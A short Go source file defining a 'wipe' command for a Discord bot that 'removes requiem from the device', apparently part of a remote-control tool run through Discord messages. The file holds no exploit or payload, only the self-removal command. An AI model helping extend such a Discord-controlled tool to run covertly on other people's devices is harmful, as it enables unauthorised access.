package commands

import (
	"requiem/funcs"

	"github.com/bwmarrin/discordgo"
)

func (*WipeCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully wiped.", msg.Reference())

	funcs.Wipe()

	ses.ChannelMessageEdit(msg.ChannelID, initial.ID, "🟥 Failed to wipe.")
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "Removes requiem from the device."
}

type WipeCommand struct{}
